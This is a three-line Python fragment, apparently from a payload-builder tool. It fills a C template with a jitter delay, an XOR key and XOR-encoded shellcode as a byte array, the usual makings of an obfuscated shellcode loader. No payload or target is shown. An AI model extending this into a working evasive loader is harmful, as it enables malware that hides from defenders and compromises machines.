        c_code = c_code.replace("{{JITTER_MS}}", str(jitter_ms))
        c_code = c_code.replace("{{XOR_KEY}}", f"0x{xor_key:02x}")
        c_code = c_code.replace("{{PAYLOAD_C_ARRAY}}", self.format_c_array(shellcode, xor_key))
        
